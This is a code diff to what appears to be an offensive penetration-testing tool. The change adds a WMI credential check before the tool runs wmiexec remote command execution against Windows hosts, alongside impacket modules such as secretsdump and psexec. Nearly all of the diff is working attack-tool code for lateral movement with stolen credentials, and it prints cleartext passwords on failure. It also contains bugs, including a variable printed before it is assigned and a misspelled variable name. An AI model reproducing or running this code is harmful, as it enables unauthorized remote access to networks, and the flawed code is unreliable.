@@ -39,6 +39,10 @@ try:
 except:
     sys.exit("[!] Install the netaddr library: pip install netaddr")
 try:
+    import wmi_client_wrapper as wmi
+except:
+    sys.exit("[!] Install the wmi_client_wrapper library: pip install wmi_client_wrapper && apt-get install wmi-client")
+try:
     import psexec, smbexec, atexec, netview
     import wmiexec as wmiexec
     import secretsdump
@@ -283,6 +287,19 @@ def http_server(port, working_dir):
     sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
     #time.sleep(1)
     return sub_proc
+
+def wmi_test(usr, pwd, dom, dst):
+    output = None
+    dom_usr = dom + "/" + usr
+    wmic = wmi.WmiClientWrapper(username=dom_usr,password=pwd,host=dst)
+    try:
+        output = wmic.query("SELECT * FROM Win32_Processor")
+    except:
+        ouptut = False
+    if output:
+        return(True)
+    else:
+        return(False)
 
 def main():
     # If script is executed at the CLI
@@ -583,11 +600,20 @@ Create Pasteable Double Encoded Script:
                 if command == "cmd.exe":
                     sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
             if attacks and not encoder:
-                attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                attack.run(dst)
+                print(test)
+                test = wmi_test(usr, pwd, dom, dst)
+                if test:
+                    attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                    attack.run(dst)
+                else:
+                    print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             else:
-                attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                attack.run(dst)
+                test = wmi_test(usr, pwd, dom, dst)
+                if test:
+                    attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                    attack.run(dst)
+                else:
+                    print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             if attacks:
                 srv.terminate()
                 print("[*] Shutting down the catapult web server")
